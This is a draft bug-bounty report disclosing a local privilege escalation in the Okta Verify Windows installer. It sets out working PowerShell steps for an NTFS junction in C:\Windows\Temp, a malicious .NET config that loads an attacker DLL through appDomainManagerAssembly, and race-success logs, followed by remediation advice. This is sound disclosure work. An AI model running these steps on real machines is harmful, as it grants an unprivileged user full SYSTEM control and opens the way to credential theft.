---
status: DRAFT
bugcrowd_id: null
submitted_date: null
---

# FORM FIELDS

## TITLE [FORM]

Standard User to SYSTEM Code Execution via Okta Verify Installer Config Injection

## TARGET [FORM]

Okta Verify (Windows)

## VRT CATEGORY [FORM]

Insecure OS/Firmware > Command Injection

> Auto-populates P1. Researcher believes actual severity is P2 (local
> privilege escalation, not remote). No P2 VRT category exists for local
> privilege escalation, so the closest accurate description was chosen.
> A standard user injects a malicious .NET config into a SYSTEM service
> via TOCTOU race + NTFS junction in the MSI installer's backup/restore
> custom actions. The service then executes attacker-controlled code as
> NT AUTHORITY\SYSTEM.

## URL / LOCATION [FORM]

OktaVerify-x64.msi v6.7.1.0 -- OktaVerifyInstaller.CustomActions.dll (embedded in MSI Binary table as bin_customactions)

---

# DESCRIPTION

### Severity Note

The VRT category "Insecure OS/Firmware > Command Injection" auto-populates P1. This finding is a local privilege escalation (standard user to SYSTEM), which the researcher believes warrants P2. However, no P2 category in the current VRT accurately describes local privilege escalation, so the closest matching category was selected. The attack requires local access and a standard user account on a machine running Okta Verify.

### What is Broken

Okta Verify for Windows includes an auto-update service ("Okta Coordinator Service") that runs as NT AUTHORITY\SYSTEM. During upgrades, the MSI installer backs up and restores this service's .NET configuration file through `C:\Windows\Temp\WOV\C\` -- a location where any standard (non-admin) Windows user can create directories and NTFS junctions. A standard user can redirect this backup path to a directory they control, swap the legitimate config with a malicious one during the upgrade, and achieve arbitrary code execution as SYSTEM.

### Proof

**Tested on:** Okta Verify 6.7.1.0 for Windows (OktaVerify-x64.msi), Windows 11 Pro 10.0.26200
**Attacker privileges:** Standard (non-admin) Windows user account
**Prerequisite:** `C:\Windows\Temp\WOV` must not already exist (pre-first-upgrade, or after Temp cleanup)

The vulnerability is a TOCTOU (time-of-check-time-of-use) race in two MSI custom actions that run during every Okta Verify upgrade:

- **BackupData** (sequence 1401, immediate CA): Copies the service config from `C:\Program Files\Okta\UpdateService\Okta.Coordinator.Service.exe.config` to `C:\Windows\Temp\WOV\C\`
- **RestoreData** (sequence 4001, deferred SYSTEM CA): Copies from `C:\Windows\Temp\WOV\C\` back to Program Files

The backup path is derived from the machine-level TEMP registry value:

```csharp
// From decompiled OktaVerifyInstaller.CustomActions.dll
ovConfigBackup = Path.Combine(
    Environment.GetEnvironmentVariable("TEMP", EnvironmentVariableTarget.Machine),
    "WOV\\C");
// Resolves to: C:\WINDOWS\TEMP\WOV\C
```

`C:\Windows\Temp` grants standard users `CreateFiles, AppendData` with `ContainerInherit`. Standard users can create directories and NTFS junctions here.

**Step 1.** Standard user creates the junction:

```powershell
# Create staging dir with permissive ACLs
$staging = "$env:LOCALAPPDATA\OktaLPE\staging"
New-Item -ItemType Directory -Path $staging -Force
$acl = Get-Acl $staging
$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
    "Everyone","FullControl","ContainerInherit,ObjectInherit","None","Allow")))
Set-Acl $staging $acl

# Create WOV directory with C as junction to staging
New-Item -ItemType Directory "C:\Windows\Temp\WOV" -Force
cmd /c mklink /J "C:\Windows\Temp\WOV\C" "$staging"
```

**Step 2.** Standard user places malicious .NET config and payload DLL:

```powershell
# Malicious config: loads attacker DLL via AppDomainManager
@'
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2"/>
  </startup>
  <runtime>
    <appDomainManagerAssembly value="OktaLPE, Version=1.0.0.0, Culture=neutral, PublicKeyToken=5306894e6a9e0bb0" />
    <appDomainManagerType value="OktaLPE.LPEManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="OktaLPE" publicKeyToken="5306894e6a9e0bb0" culture="neutral" />
        <codeBase version="1.0.0.0" href="file:///C:/ProgramData/Okta/OktaLPE.dll" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <appSettings><add key="LogLevel" value="Info"/></appSettings>
</configuration>
'@ | Set-Content "$staging\Okta.Coordinator.Service.exe.config"

# Copy strong-named payload DLL to user-writable ProgramData\Okta
Copy-Item OktaLPE.dll "C:\ProgramData\Okta\OktaLPE.dll"
```

**Step 3.** When Okta Verify upgrades (auto-update or manual), the MSI runs:

- BackupData (seq 1401) writes the real config through the junction into the staging directory. The file inherits `Everyone: FullControl` from the staging directory ACLs.
- Standard user's FileSystemWatcher detects the write, deletes the real config, and replaces it with the malicious version. The TOCTOU window spans from sequence 1401 to 4001 (multiple seconds of MSI file operations in between).
- RestoreData (seq 4001, running as SYSTEM) reads through the junction, gets the malicious config, and copies it to `C:\Program Files\Okta\UpdateService\Okta.Coordinator.Service.exe.config`.

**Step 4.** The Okta Coordinator Service starts with the injected config. The .NET runtime loads `OktaLPE.dll` from `C:\ProgramData\Okta\` via the `appDomainManagerAssembly` directive. Attacker code executes as NT AUTHORITY\SYSTEM.

**Individual chain links verified:**

Junction following by File.Copy:
```
File.Copy succeeded
Owner: SKINNYD\uglyt
  Everyone : FullControl (Allow)
```

AppDomainManager loaded from user-writable ProgramData:
```
DomainManager: OktaLPE.LPEManager
Location: C:\ProgramData\Okta\OktaLPE.dll

Marker file:
Okta Verify LPE PoC - SYSTEM Code Execution
Running as: skinnyd\uglyt
Process: TestLoader2 (PID 75548)
```

ProgramData\Okta is user-writable:
```
BUILTIN\Users : Write (Allow) Inherit=ContainerInherit
```

C:\Windows\Temp allows junction creation by standard users:
```
BUILTIN\Users : CreateFiles, AppendData, ExecuteFile, Synchronize (Allow)
  Inherit=ContainerInherit
Junction created for C:\Windows\Temp\WOV_junc_2943adb1 <<===>> target
```

**TOCTOU race reliability (10 runs against real MSI custom actions with full cleanup between each):**

Each run triggers the actual BackupData and RestoreData custom actions via `msiexec /i` with `WIX_UPGRADE_DETECTED`. The FileSystemWatcher detects BackupData's write and swaps the config in 61-77ms. RestoreData then copies the attacker's config to `C:\Program Files\Okta\UpdateService\`. Malicious config confirmed in Program Files on every run.

```
Run  1: PASS -- Swap in 64ms, malicious config in Program Files (total 2797ms)
Run  2: PASS -- Swap in 70ms, malicious config in Program Files (total 2803ms)
Run  3: PASS -- Swap in 65ms, malicious config in Program Files (total 2812ms)
Run  4: PASS -- Swap in 77ms, malicious config in Program Files (total 2768ms)
Run  5: PASS -- Swap in 68ms, malicious config in Program Files (total 2786ms)
Run  6: PASS -- Swap in 66ms, malicious config in Program Files (total 2783ms)
Run  7: PASS -- Swap in 64ms, malicious config in Program Files (total 2773ms)
Run  8: PASS -- Swap in 61ms, malicious config in Program Files (total 2782ms)
Run  9: PASS -- Swap in 64ms, malicious config in Program Files (total 2793ms)
Run 10: PASS -- Swap in 72ms, malicious config in Program Files (total 2787ms)

Success rate: 10/10 (100%)
```

### Impact

- Any standard Windows user can achieve NT AUTHORITY\SYSTEM code execution on machines running Okta Verify
- The auto-update service runs as SYSTEM and the upgrade can be triggered by any user via the Okta Coordinator named pipe (BUILTIN\Users: FullControl), eliminating the need to wait for a scheduled update
- Full machine compromise: persistence, credential theft, lateral movement from any workstation in an Okta-protected enterprise
- No user interaction required beyond the initial file plant

### CWE Classification

**CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition**
The MSI installer backs up the service config in an immediate custom action and restores it in a deferred custom action with a wide execution gap between them, allowing file modification between check and use.

**CWE-59: Improper Link Resolution Before File Access ('Link Following')**
Neither BackupFile() nor RestoreConfiguration() check for NTFS junction reparse points before performing File.Copy operations, allowing an attacker to redirect file operations to arbitrary directories.

### Remediation

1. **Use a secure backup location.** Replace `C:\Windows\Temp` with a SYSTEM-only directory (e.g., create a randomized subdirectory under the service's install path with restrictive ACLs).
2. **Check for reparse points.** Before any privileged file operation, verify that the path contains no junctions or symlinks using `FileAttributes.ReparsePoint`.
3. **Validate backup integrity.** Compute and verify a hash or signature on backed-up files before restoring them.
4. **Restrict ProgramData\Okta ACLs.** Remove `BUILTIN\Users: Write` from `C:\ProgramData\Okta\` and use service-account-specific ACLs.

See attached technical writeup and PoC scripts for full decompilation analysis and exploitation code.

---

# ATTACHMENTS

| File | Description |
|------|-------------|
| `msi-config-injection-lpe.md` | Full technical writeup with decompiled source references |
| `okta-lpe-poc.ps1` | Complete PoC script (Plant/Monitor/Check/Cleanup modes) |
| `okta-lpe-payload.cs` | Payload DLL source (AppDomainManager subclass) |
| `OktaLPE.csproj` + `key.snk` | Build files for strong-named payload assembly |

---

# PRE-SUBMISSION CHECKLIST

- [x] **ONE bug only.** Config injection LPE via TOCTOU in MSI backup/restore.
- [x] **No Anticipated Questions.**
- [x] **No internal references.** No submission numbers or internal tracking.
- [x] **No local file paths** from our machines in the description.
- [x] **Researcher handle:** Lucid_Duck (in BUGCROWD headers of PoC).
- [x] **Title:** Under 80 chars. States the one bug as a consequence.
- [x] **Target:** "Okta Verify (Windows)" -- exact match from scope (Other In-Scope Targets).
- [x] **VRT:** Verified against VRT-OFFICIAL-TAXONOMY.md. "Insecure OS/Firmware > Command Injection" auto-populates P1. No P2 LPE category exists in VRT. Severity note in description body explains researcher assessment of P2.
- [x] **URL:** Identifies the specific MSI and DLL.
- [x] **CVE precedent:** Omitted (no exact match for MSI custom action TOCTOU with junction + .NET config injection).
- [x] **CWE:** CWE-367 (TOCTOU) and CWE-59 (Link Following) are exact matches.
- [x] **Attachments listed.** All 4 files exist in the repo.
- [x] **Remediation included.** Four actionable items.
